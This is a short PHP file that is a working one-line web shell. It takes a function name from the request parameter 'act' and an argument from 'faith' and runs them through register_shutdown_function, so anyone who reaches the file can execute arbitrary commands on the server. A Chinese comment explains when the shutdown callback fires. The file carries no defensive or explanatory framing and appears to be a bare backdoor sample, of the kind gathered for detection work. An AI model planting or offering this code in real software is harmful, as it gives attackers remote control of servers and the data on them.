<?php 
$act = $_REQUEST['act'];
register_shutdown_function($act, $_REQUEST['faith']);
#当我们的脚本执行完成或意外死掉导致PHP执行即将关闭时,我们的这个函数将会 被调用
 
?>